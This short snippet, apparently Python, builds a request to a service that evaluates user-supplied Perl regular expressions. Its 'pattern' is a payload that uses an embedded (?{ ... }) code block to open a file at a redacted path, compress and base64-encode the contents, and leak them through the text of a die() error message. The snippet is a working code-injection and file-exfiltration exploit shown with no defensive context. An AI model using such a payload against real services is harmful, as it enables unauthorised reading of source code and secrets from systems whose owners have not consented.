payload = "(?{ open F,'[redacted source path]'; binmode F; local $/; my $s=<F>; require Compress::Zlib; require MIME::Base64; my $b=MIME::Base64::encode_base64(Compress::Zlib::memGzip($s),''); die 'START'.length($b).'__'.substr($b,0,3000).'__END' })a"
request = {"pattern": payload, "text": "a"}
